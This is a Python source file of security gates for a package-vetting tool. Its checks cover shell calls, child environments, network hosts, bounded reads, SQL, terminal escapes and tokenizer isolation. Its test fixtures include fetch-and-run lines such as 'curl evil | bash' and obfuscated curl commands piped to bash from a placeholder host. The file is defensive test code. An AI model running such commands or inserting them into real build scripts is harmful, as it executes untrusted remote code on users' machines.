"""Extracted from security_gates.py: _input_bounds."""

import ast
import contextlib
import io
import re
import time
from scripts.gates._core import Gate, HOSTILE, SRC, _ARTIFACT_MODULES, _ARTIFACT_READ_EXEMPT, _BOUNDED_IO_MODULE, _ENDPOINT_HOST, _FORBIDDEN_CALLS, _NETWORK_CALLS, _NETWORK_MODULES, _RELEASE_HOSTS, _RELEASE_MODULES, _URL_LITERAL_RE, _call_name, _enclosing_functions, _hostile_fact, _hostile_result, _python_files, _rel, _render_forget_list, _render_list_rows

__all__ = ['gate_artifact_reads_are_bounded', 'gate_dead_tokenizer_child_fails_the_package', 'gate_every_child_process_gets_an_explicit_environment', 'gate_every_live_regex_is_audited', 'gate_every_stream_read_is_bounded', 'gate_expansion_is_bounded', 'gate_freshness_uses_local_marker', 'gate_git_worker_limit_failures_are_reported', 'gate_git_worker_startup_is_isolated', 'gate_network_is_confined', 'gate_network_reads_are_bounded', 'gate_no_interpreter_calls', 'gate_no_path_based_archive_extraction', 'gate_regex_patterns_pass_adversarial_audit', 'gate_single_network_host', 'gate_sql_is_parameterised', 'gate_terminal_output_is_inert', 'gate_tokenizer_module_is_isolated', 'gate_tokenizer_pool_wait_is_bounded', 'gate_tokenizer_smoke_is_deterministic', 'gate_tokenizer_worker_startup_is_isolated', 'gate_untrusted_text_is_sanitised_where_it_is_rendered']

def gate_no_interpreter_calls() -> Gate:
    """No path turns text into code, and nothing is unpickled."""
    hits: list[str] = []
    for path in _python_files():
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                name = _call_name(node)
                if name in _FORBIDDEN_CALLS:
                    hits.append(f"{_rel(path)}:{node.lineno} {name}()")
                if name.endswith("run") or name.endswith("Popen") or name.endswith("call"):
                    for kw in node.keywords:
                        if kw.arg == "shell" and not (
                            isinstance(kw.value, ast.Constant) and kw.value.value is False
                        ):
                            hits.append(f"{_rel(path)}:{node.lineno} shell=")
    return Gate("no interpreter or shell execution", not hits, hits)

def gate_every_child_process_gets_an_explicit_environment() -> Gate:
    """A child process must not inherit the parent's environment.

    Process-startup variables turn "run a child" into "run attacker code":
    ``PYTHONPATH`` makes ``site`` import ``sitecustomize`` at interpreter
    startup (the tokenizer-worker finding), and ``LD_PRELOAD`` /
    ``LD_LIBRARY_PATH`` map an attacker's library into any child, interpreter
    or not (``PERL5LIB``, ``RUBYOPT``, ``BASH_ENV``, ``NODE_OPTIONS`` are the
    per-runtime equivalents).  Every ``subprocess`` call in ``src/`` must pass
    an explicit ``env=`` - in practice ``trustsight.subproc.minimal_env()``.
    """
    calls = {
        "subprocess.run", "subprocess.call", "subprocess.check_call",
        "subprocess.check_output", "subprocess.Popen",
    }
    hits: list[str] = []
    for path in _python_files():
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            name = _call_name(node)
            if name not in calls:
                continue
            if not any(kw.arg == "env" for kw in node.keywords):
                hits.append(f"{_rel(path)}:{node.lineno} {name} without env=")
    return Gate("every child process gets an explicit environment", not hits,
                hits)

def gate_network_is_confined() -> Gate:
    """Only the listed fetch and notify modules may open a connection."""
    hits: list[str] = []
    for path in _python_files():
        rel = path.relative_to(SRC).as_posix()
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            name = _call_name(node).split(".")[-1]
            if name in _NETWORK_CALLS and rel not in _NETWORK_MODULES:
                hits.append(f"{_rel(path)}:{node.lineno} {name}()")
    return Gate("network confined to the fetch modules", not hits, hits)

def gate_single_network_host() -> Gate:
    """Every endpoint constant names a declared host: the AUR, or the
    release channel from the release module and nothing else."""
    hits: list[str] = []
    found = set()
    for path in _python_files():
        rel = path.relative_to(SRC).as_posix()
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if not isinstance(node, ast.Assign):
                continue
            names = [t.id for t in node.targets if isinstance(t, ast.Name)]
            if not any(n.upper().rstrip("_").endswith("URL") for n in names):
                continue
            if not isinstance(node.value, ast.Constant) or not isinstance(node.value.value, str):
                continue
            for host in _URL_LITERAL_RE.findall(node.value.value):
                found.add(host)
                if host == _ENDPOINT_HOST:
                    continue
                if host in _RELEASE_HOSTS and rel in _RELEASE_MODULES:
                    continue
                hits.append(f"{_rel(path)}:{node.lineno} {host}")
    if not found:
        hits.append("no endpoint constant found: the check is not looking at anything")
    return Gate("one network host, declared", not hits, hits or sorted(found))

def gate_network_reads_are_bounded() -> Gate:
    """Every outbound request carries an explicit timeout."""
    hits: list[str] = []
    for path in _python_files():
        if path.relative_to(SRC).as_posix() not in _NETWORK_MODULES:
            continue
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            if _call_name(node).split(".")[-1] not in ("urlopen", "urlretrieve"):
                continue
            if not any(kw.arg == "timeout" for kw in node.keywords):
                hits.append(f"{_rel(path)}:{node.lineno} no timeout=")
    return Gate("every request has a timeout", not hits, hits)

def gate_no_path_based_archive_extraction() -> Gate:
    """No archive member is written to a path the archive chose.

    Narrower than "archives are never extracted", which is what this used
    to be called, and which was broader than both the check and the truth:
    the seed importer does write members to disk (``db._extract_v2_archive``),
    under an explicit containment guard.  What is banned is handing a
    member's own name to the extractor, because that is the path-traversal
    primitive; a manual write under a checked name is a different thing and
    A8 now says so.
    """
    hits: list[str] = []
    for path in _python_files():
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                name = _call_name(node).split(".")[-1]
                # tarfile.extractfile returns a file-like object and does not
                # write to disk; only path-based extraction is prohibited.
                if name in ("extract", "extractall", "unpack_archive"):
                    hits.append(f"{_rel(path)}:{node.lineno} {name}()")
    return Gate("no path-based archive extraction", not hits, hits)

def gate_every_stream_read_is_bounded() -> Gate:
    """A4/A14: a read with no size is the other end choosing the size.

    Structural over the whole source rather than pointed at the sites that
    were wrong, because the recurring failure here is a control applied at
    one of several equivalent call sites.  ``extractfile().read()`` honours
    the member's declared size, which is the attacker's number: a member
    declaring thirty gigabytes is allocated in full, and a 32 MiB gzip on
    compressible content is enough to declare it.  So the bound belongs on
    the read, and a size argument is what this looks for.
    """
    hits: list[str] = []
    checked = 0
    for path in _python_files():
        if path.name == _BOUNDED_IO_MODULE:
            continue
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            if not isinstance(node.func, ast.Attribute) or node.func.attr != "read":
                continue
            checked += 1
            if not node.args and not node.keywords:
                hits.append(f"{_rel(path)}:{node.lineno} unbounded read()")
    return Gate("every stream read is bounded", not hits,
                hits or f"{checked} read() calls, all sized")

def gate_artifact_reads_are_bounded() -> Gate:
    """A4: an artifact is bounded before it is materialised, not after.

    A signature is computed over the bytes, so verification cannot run
    until they have been read: the bound sits in front of the check, or it
    guards nothing.  The same applies to a digest recorded for attribution
    (A12) and to a gzip cap that only ever sees an already-materialised
    buffer.
    """
    problems: list[str] = []
    covered: list[str] = []
    for rel in _ARTIFACT_MODULES:
        path = SRC / rel
        if not path.exists():
            problems.append(f"{rel} is missing")
            continue
        covered.append(rel)
        tree = ast.parse(path.read_text(encoding="utf-8"))
        owner = _enclosing_functions(tree)
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            if not isinstance(node.func, ast.Attribute):
                continue
            if node.func.attr not in ("read_bytes", "read_text"):
                continue
            if owner.get(node.lineno) in _ARTIFACT_READ_EXEMPT:
                continue
            problems.append(
                f"{rel}:{node.lineno} unbounded {node.func.attr}() "
                f"in {owner.get(node.lineno, '<module>')}"
            )
    return Gate("artifact reads are bounded before verification", not problems,
                problems or covered)

def gate_sql_is_parameterised() -> Gate:
    """No SQL string is assembled from an expression.

    SQLite cannot bind a table or column name, so a handful of statements
    interpolate an *identifier* taken from a bare local that iterates a
    literal list in the same module (the schema-migration loop, the
    forget-package sweep, the seed's placeholder run).  Those are allowed,
    and they are the only allowed form: an interpolated attribute,
    subscript, call or concatenation is a value reaching the statement
    text, which is what parameters exist to prevent.
    """
    hits: list[str] = []
    for path in _python_files():
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            if _call_name(node).split(".")[-1] not in ("execute", "executemany", "executescript"):
                continue
            if not node.args:
                continue
            sql = node.args[0]
            if isinstance(sql, ast.JoinedStr):
                for value in sql.values:
                    if isinstance(value, ast.FormattedValue) and not isinstance(
                        value.value, ast.Name
                    ):
                        hits.append(f"{_rel(path)}:{node.lineno} computed SQL")
                        break
            elif isinstance(sql, ast.BinOp):
                hits.append(f"{_rel(path)}:{node.lineno} concatenated SQL")
    return Gate("SQL is parameterised", not hits, hits)

def gate_terminal_output_is_inert() -> Gate:
    """No renderer lets a hostile package write escapes to the terminal.

    *Every* render path, not one of them.  The first version of this gate
    exercised ``review``'s Rich renderer alone and passed while
    ``_inspect_rich`` leaked escape sequences through an unsanitised rule
    id, which is the failure mode described in
    [reviewing a security control](../docs/contributing/security-review.md):
    a control applied at one of several equivalent call sites, with the
    check pointed at a covered one.
    """

    from rich.console import Console

    import trustsight.cli.corpus as corpus_cli
    import trustsight.cli.display as display
    import trustsight.cli.inspect as inspect_cli
    import trustsight.cli.review as review

    fact, result = _hostile_fact(), _hostile_result()

    def rich(fn) -> str:
        buffer = io.StringIO()
        saved = display._console
        display._console = Console(file=buffer, force_terminal=False, width=200)
        try:
            fn()
        finally:
            display._console = saved
        return buffer.getvalue()

    def plain(fn) -> str:
        buffer = io.StringIO()
        with contextlib.redirect_stdout(buffer):
            fn()
        return buffer.getvalue()

    renders = {
        "review rich": lambda: rich(
            lambda: review._render_results_rich([result], 1, False, True, True, False)),
        "inspect rich": lambda: rich(
            lambda: inspect_cli._inspect_rich(fact, show_score=True, show_risk=True)),
        "inspect plain": lambda: plain(
            lambda: inspect_cli._inspect_plain(fact, show_score=True, show_risk=True)),
        # forget/history/list were outside this gate entirely, and
        # forget echoed DB-stored package names raw.  Every surface that
        # prints attacker-influenced text belongs here, not the three that
        # were convenient to construct.
        "forget list": lambda: plain(lambda: _render_forget_list([HOSTILE])),
        "list table": lambda: rich(lambda: _render_list_rows([{
            "name": HOSTILE, "version": "1.0", "last_checked": "2026-01-01",
            "score": 40, "risk": "Medium", "maintainer": HOSTILE,
        }])),
        "corpus pivot": lambda: rich(lambda: corpus_cli._render_pivot({
            "indicator": HOSTILE, "type": "host", "listed": True,
            "confidence": HOSTILE, "sources": ["corpus"],
            "matches": [{"package": HOSTILE, "surface": HOSTILE, "detail": HOSTILE}],
        })),
    }

    problems = []
    for name, run in renders.items():
        try:
            out = run()
        except Exception as exc:  # a crash is also a way to lose the batch
            problems.append(f"{name}: raised {type(exc).__name__}")
            continue
        if "\x1b" in out or "\x9b" in out:
            problems.append(f"{name}: escape sequence reached the terminal")
        if "VERDICT: CLEAN" in out and "[bold red]" not in out:
            problems.append(f"{name}: markup was interpreted, not printed")
    return Gate("terminal output is inert", not problems,
                problems or sorted(renders))

def gate_freshness_uses_local_marker() -> Gate:
    """A11: a package-supplied timestamp cannot override a local freshness marker.

    ``_is_current`` in ``sandbox/git_project.py`` must read the local marker
    (``last_fetch_time``) before consulting the HEAD commit time.
    The commit-time path is a fallback for clones that predate the marker
    and must only execute when the marker is absent.
    """
    fetcher = SRC / "sandbox" / "git_project.py"
    tree = ast.parse(fetcher.read_text(encoding="utf-8"))
    problems: list[str] = []

    # Find _is_current function.
    is_current = None
    for node in ast.walk(tree):
        if isinstance(node, ast.FunctionDef) and node.name == "_is_current":
            is_current = node
            break
    if is_current is None:
        return Gate("freshness uses local marker", False,
                    "_is_current not found in git_project.py")

    # The function body must reference last_fetch_time.
    has_marker = False
    has_commit_time = False
    for node in ast.walk(is_current):
        if isinstance(node, ast.Call) and _call_name(node) == "last_fetch_time":
            has_marker = True
        if isinstance(node, ast.Attribute) and node.attr == "commit_time":
            has_commit_time = True

    if not has_marker:
        problems.append("_is_current does not call last_fetch_time")
    if not has_commit_time:
        problems.append("_is_current does not reference commit_time (fallback removed?)")

    # The commit_time access must follow the marker check.  The pattern is:
    #   fetched = last_fetch_time(repo)
    #   if fetched is not None:
    #       ... return True ...
    #   # fallback: commit.commit_time >= upstream_mtime
    # We verify that an If node in the body guards on the variable that
    # last_fetch_time assigned to, and that commit_time appears only after
    # that If block.
    if has_marker and has_commit_time:
        body = is_current.body
        found_marker_guard = False
        marker_var = None
        # Walk the top-level body looking for the pattern:
        #   <var> = last_fetch_time(...)
        #   if <var> is not None: ...
        for i, stmt in enumerate(body):
            # Look for: var = last_fetch_time(repo)
            if (isinstance(stmt, ast.Assign)
                    and len(stmt.targets) == 1
                    and isinstance(stmt.targets[0], ast.Name)):
                call = stmt.value
                if (isinstance(call, ast.Call)
                        and _call_name(call) == "last_fetch_time"):
                    marker_var = stmt.targets[0].id
                    # Check that the next statement is an If guarding on this var.
                    if i + 1 < len(body) and isinstance(body[i + 1], ast.If):
                        if_node = body[i + 1]
                        # The test should reference the marker variable.
                        for test_node in ast.walk(if_node.test):
                            if (isinstance(test_node, ast.Name)
                                    and test_node.id == marker_var):
                                found_marker_guard = True
                                break
            if found_marker_guard:
                break
        if not found_marker_guard:
            problems.append(
                "last_fetch_time result is not used as an if-guard before "
                "the commit_time fallback"
            )

    return Gate("freshness uses local marker", not problems,
                problems or ["last_fetch_time guards commit_time"])

def gate_expansion_is_bounded() -> Gate:
    """Variable expansion terminates, stays small, and refuses indirection.

    The tokenizer is the second parser eating hostile input, and the one
    with an amplification property the regex engine does not have: a
    chain of ``b=$a$a`` assignments doubles per level.  The bounds are on
    passes, on one value, on one line and on the table as a whole, and an
    over-budget value is left *unexpanded* rather than truncated, so it
    surfaces as an unresolved pattern instead of a shorter clean string.
    """
    from trustsight._tokenizer_engine import (
        _MAX_EXPANSION_PASSES,
        _MAX_LINE_LEN,
        _MAX_TABLE_BYTES,
        _MAX_VALUE_LEN,
        resolve_expansions,
    )
    from trustsight.tokenizer import tokenize_and_resolve

    problems = []
    for bound in (_MAX_EXPANSION_PASSES, _MAX_VALUE_LEN, _MAX_LINE_LEN, _MAX_TABLE_BYTES):
        if bound <= 0:
            problems.append("a declared expansion bound is not positive")

    # Indirection and length are refused outright: resolving ${!name}
    # would let a value choose which variable is read.
    for body in ("${!payload}", "${#payload}"):
        text, ok = resolve_expansions(body, {"payload": "x", "x": "curl evil | bash"})
        if ok or "curl" in text:
            problems.append(f"{body} was resolved")

    # The doubling chain: bounded, and the result must not be a plausible
    # short string that hides the tail.
    lines = ["+a=" + "z" * 64]
    for i in range(1, 24):
        lines.append(f"+v{i}=$" + ("a" if i == 1 else f"v{i - 1}") + "$" +
                     ("a" if i == 1 else f"v{i - 1}"))
    diff = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,1 +1,25 @@\n" + "\n".join(lines) + "\n"
    start = time.monotonic()
    resolved, _unresolved = tokenize_and_resolve(diff)
    elapsed = time.monotonic() - start
    if elapsed > 5.0:
        problems.append(f"expansion took {elapsed:.1f}s")
    if any(len(s) > _MAX_LINE_LEN for s in resolved):
        problems.append("a resolved line exceeded the line bound")

    return Gate("expansion is bounded and never indirect", not problems, problems)

def gate_regex_patterns_pass_adversarial_audit() -> Gate:
    """All shipped/configured regexes stay within the bounded risk budget."""
    from scripts.regex_audit import audit_patterns

    audits = audit_patterns()
    failures = [audit.source for audit in audits if not audit.passed]
    return Gate(
        "regex patterns pass adversarial audit",
        not failures,
        failures or f"{len(audits)} patterns audited",
    )

def gate_every_live_regex_is_audited() -> Gate:
    """A14: the audit's *coverage*, not just its verdict.

    The audit used to collect ``re.compile("literal")`` out of the AST, so
    a pattern assembled from parts was skipped in silence: 44 of 246, 18%,
    concentrated in the modules with the most shared prefixes. A gate that
    passes because it never looked is the failure this codebase keeps
    finding, so coverage is asserted rather than assumed.
    """
    import importlib

    from scripts.regex_audit import audit_patterns

    audited = {audit.pattern for audit in audit_patterns()}

    missing: list[str] = []
    for path in sorted(SRC.rglob("*.py")):
        parts = [
            part
            for part in path.relative_to(SRC).with_suffix("").parts
            if part != "__init__"
        ]
        if not parts or parts[0] == "cli" or "__main__" in parts:
            continue
        name = "trustsight." + ".".join(parts)
        try:
            module = importlib.import_module(name)
        except Exception:
            continue
        for attr, value in vars(module).items():
            candidates = (
                [value]
                if isinstance(value, re.Pattern)
                else list(value)
                if isinstance(value, (list, tuple, frozenset, set))
                else []
            )
            for item in candidates:
                if isinstance(item, re.Pattern) and item.pattern not in audited:
                    missing.append(f"{name}.{attr}")

    # Rules whose pattern is generated at match time are invisible to all
    # three collection strategies at once: not a TOML literal, not a
    # `re.compile("literal")` in the source, and not a module-level
    # `re.Pattern`. R013 is the FATAL homoglyph rule.
    import tomllib

    from trustsight.config import DEFAULT_RULES
    from trustsight.rules import GENERATED_PATTERN_RULES, resolve_generated_patterns

    generated = tomllib.loads(DEFAULT_RULES).get("rules", [])
    resolve_generated_patterns(generated)
    for rule in generated:
        if rule.get("id") in GENERATED_PATTERN_RULES:
            if rule.get("pattern") not in audited:
                missing.append(f"generated rule {rule['id']}")

    return Gate(
        "every live regex is audited",
        not missing,
        missing or f"{len(audited)} distinct patterns cover every live object",
    )

def gate_untrusted_text_is_sanitised_where_it_is_rendered() -> Gate:
    """A1/B7: printed evidence cannot repaint the screen or abort a render.

    `safe_text.clean` is the boundary function. Two render paths used
    `unicode.strip_ansi` instead, which removes CSI sequences and leaves C1
    control bytes, BEL and newlines - and `\x9b2J` is the 8-bit spelling of
    "clear the screen". A third passed federated IOC values to Rich as bare
    strings, where `[/]` raises `MarkupError` and aborts the whole table.

    Checked on calls and imports rather than on the substring, so a comment
    explaining the rule does not trip it.
    """
    cli = SRC / "cli"
    problems: list[str] = []

    for path in sorted(cli.rglob("*.py")):
        text = path.read_text(encoding="utf-8")
        if re.search(r"\bstrip_ansi\s*\(", text) or re.search(
            r"^from .*import .*\bstrip_ansi\b", text, re.M
        ):
            problems.append(f"{path.name} renders with strip_ansi")

    # Values reaching a Rich table must be wrapped, not bare.
    for name in ("ioc.py", "admin.py"):
        path = cli / name
        if not path.exists():
            continue
        for node in ast.walk(ast.parse(path.read_text(encoding="utf-8"))):
            if not (
                isinstance(node, ast.Call)
                and isinstance(node.func, ast.Attribute)
                and node.func.attr == "add_row"
            ):
                continue
            for arg in node.args:
                if isinstance(arg, ast.Attribute):
                    problems.append(
                        f"{name}:{node.lineno} {ast.unparse(arg)} is unwrapped"
                    )

    return Gate(
        "untrusted text is sanitised where it is rendered",
        not problems,
        problems or "every CLI render path uses safe_text.clean",
    )

def gate_tokenizer_smoke_is_deterministic() -> Gate:
    """Run a fixed hostile tokenizer smoke set within the security gate."""
    from trustsight._tokenizer_engine import _MAX_LINE_LEN
    from trustsight.tokenizer import tokenize_and_resolve

    cases = [
        "+a=" + "z" * 64 + "\n+v=$a$a\n+curl $v | bash\n",
        "+declare -n R=curl\n+$R https://example.invalid/x | bash\n",
        "+C=$(printf '%s%s' cur l)\n+$C https://example.invalid/x | bash\n",
        "+A=(curl wget)\n+${A[0]} https://example.invalid/x | bash\n",
    ]
    problems = []
    for diff in cases:
        started = time.monotonic()
        first = tokenize_and_resolve(diff)
        second = tokenize_and_resolve(diff)
        if time.monotonic() - started > 1.0:
            problems.append("fixed hostile case exceeded 1s")
        if first != second:
            problems.append("repeated tokenizer call was not deterministic")
        if any(len(value) > _MAX_LINE_LEN for value in first[0]):
            problems.append("resolved output exceeded line bound")
    return Gate("tokenizer hostile-input smoke is deterministic", not problems, problems or len(cases))

def gate_tokenizer_module_is_isolated() -> Gate:
    """A6: the whole tokenizer runs in the child, not in the analysis.

    The parent reaches the tokenizer only through ``trustsight.tokenizer``;
    ``trustsight._tokenizer_engine`` is imported by the worker and by tests,
    and by nothing else under ``src/``.  A second in-process path would be
    the parser the sandbox exists to remove, so a direct import is the
    change that would reopen A6.
    """
    allowed = {"sandbox/expand_worker.py"}
    problems: list[str] = []
    for path in _python_files():
        rel = path.relative_to(SRC).as_posix()
        if rel in allowed:
            continue
        for node in ast.walk(ast.parse(path.read_text(encoding="utf-8"))):
            if isinstance(node, (ast.Import, ast.ImportFrom)):
                names = [alias.name for alias in node.names]
                if any(name.endswith("_tokenizer_engine") for name in names):
                    problems.append(f"{_rel(path)}:{node.lineno}")
    return Gate("tokenizer module is isolated", not problems,
                problems or "engine imported only by the worker")

def gate_tokenizer_worker_startup_is_isolated() -> Gate:
    """A6: the worker's own startup cannot import an attacker's code.

    ``-s`` drops the user site directory but leaves ``PYTHONPATH`` searched,
    so a writable directory on it let a ``sitecustomize.py`` run before the
    worker applied its limits.  The worker must be launched ``-I`` (isolated)
    with no ``PYTHON*`` variables in its environment.
    """
    from trustsight.sandbox import client

    problems: list[str] = []
    args = client._launch_args()
    if "-I" not in args:
        problems.append("worker is not launched isolated (-I)")
    env = client._child_env()
    leaked = sorted(k for k in env if k.startswith("PYTHON"))
    if leaked:
        problems.append(f"worker environment carries PYTHON* vars: {leaked}")
    return Gate("tokenizer worker startup is isolated", not problems,
                problems or "isolated (-I), no PYTHON* env")

def gate_git_worker_startup_is_isolated() -> Gate:
    """A16: the git worker's own startup cannot import an attacker's code.

    Same launch rule as the tokenizer worker, through the shared spawn helper:
    an isolated interpreter (``-I``) and a minimal environment, so a writable
    directory on ``PYTHONPATH`` cannot run a ``sitecustomize.py`` before the
    worker applies its limits.  The worker module itself is fixed here rather
    than taken from the caller.
    """
    import inspect

    from trustsight.sandbox import _spawn, git_client
    from trustsight.subproc import minimal_env

    problems: list[str] = []
    args = _spawn.launch_args(git_client._WORKER_MODULE)
    if "-I" not in args:
        problems.append("the git worker is not launched isolated (-I)")
    if git_client._WORKER_MODULE != "trustsight.sandbox.git_worker":
        problems.append("the git worker module name changed")
    leaked = sorted(k for k in minimal_env() if k.startswith("PYTHON"))
    if leaked:
        problems.append(f"the git worker environment carries PYTHON* vars: {leaked}")
    if "env=minimal_env()" not in inspect.getsource(_spawn.spawn_isolated):
        problems.append("the git worker does not get a minimal environment")
    return Gate("git worker startup is isolated", not problems,
                problems or "isolated (-I), minimal env")

def gate_git_worker_limit_failures_are_reported() -> Gate:
    """A16: a resource limit that fails to apply is reported, not swallowed.

    The git worker is a resource-bounded subprocess, not an OS sandbox, so a
    ``setrlimit`` or ``PR_SET_NO_NEW_PRIVS`` that fails leaves the isolation
    weaker than the design intends.  That must surface to the parent (the
    ``degraded`` field) rather than vanish into a bare ``except: pass``.
    """
    from unittest.mock import patch

    from trustsight.sandbox import git_worker

    problems: list[str] = []
    with patch.object(git_worker.resource, "setrlimit",
                      side_effect=OSError("denied")), \
            patch.object(git_worker.ctypes, "CDLL",
                         side_effect=AttributeError("no libc")):
        failures = git_worker._apply_limits()
    if len(failures) != 5:
        problems.append(f"expected five reported failures, got {len(failures)}")
    if not any("RLIMIT_AS" in f for f in failures):
        problems.append("an rlimit failure was not named")
    if not any("PR_SET_NO_NEW_PRIVS" in f for f in failures):
        problems.append("a NO_NEW_PRIVS failure was not named")
    return Gate("git worker limit failures are reported", not problems,
                problems or "failures are returned, not swallowed")

def gate_tokenizer_pool_wait_is_bounded() -> Gate:
    """A6/A14: a saturated pool refuses at a deadline, never blocks forever.

    The pool saturates at ``WORKER_POOL_SIZE``; past that the caller waits
    for a checked-out worker.  That wait must carry a finite timeout, so a
    single wedged holder cannot hang the whole review.
    """
    import queue
    from types import SimpleNamespace
    from unittest.mock import patch

    from trustsight.sandbox import client

    problems = []
    occupied = [object() for _ in range(client.WORKER_POOL_SIZE)]
    observed = []

    def bounded_wait(timeout=None):
        if timeout is None:
            raise AssertionError("unbounded pool wait")
        if not 0 < timeout <= client.REQUEST_TIMEOUT_SECONDS:
            raise AssertionError(f"invalid pool timeout: {timeout}")
        observed.append(timeout)

    with patch.multiple(client, _pool=queue.Queue(), _all=occupied,
                        _Worker=lambda: SimpleNamespace(start=lambda: None)), \
            patch.object(client._lock, "wait", bounded_wait), \
            patch.object(client.time, "monotonic",
                         side_effect=[0.0, 0.0, client.REQUEST_TIMEOUT_SECONDS + 1.0]):
        try:
            client._acquire()
        except client.TokenizerUnavailable:
            pass
        except Exception as exc:
            problems.append(f"pool timeout: {exc}")
        else:
            problems.append("saturated pool did not refuse at its deadline")
    if not observed:
        problems.append("saturated pool never waited with a bounded timeout")
    return Gate("tokenizer pool waits are bounded", not problems,
                problems or "a saturated pool refuses at a bounded deadline")

def gate_dead_tokenizer_child_fails_the_package() -> Gate:
    """A6/B2: a child that cannot answer yields NOT vetted, not a quiet run.

    The facade raises :class:`TokenizerUnavailable`; the batch runner
    already turns any exception into a result carrying ``failed: True`` and
    a verdict saying the package was NOT vetted.  This forces the spawn to
    fail and proves the real ``scan_diff`` path reaches that raise instead
    of completing with the parser missing.
    """
    from trustsight.analysis.pipeline import scan_diff
    from trustsight.sandbox import client
    from trustsight.tokenizer import TokenizerUnavailable

    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
        "+C=curl\n+$C https://example.invalid/x | bash\n"
    )
    problems: list[str] = []
    original = client._acquire

    def dead():
        raise TokenizerUnavailable("tokenizer_unavailable: forced for the gate")

    client._acquire = dead
    try:
        scan_diff(diff, package_name="sandbox-gate")
    except TokenizerUnavailable:
        pass
    except Exception as exc:
        problems.append(f"wrong exception: {type(exc).__name__}: {exc}")
    else:
        problems.append("analysis completed with no tokenizer child")
    finally:
        client._acquire = original
    return Gate("a dead tokenizer child fails the package", not problems,
                problems or "raises TokenizerUnavailable")
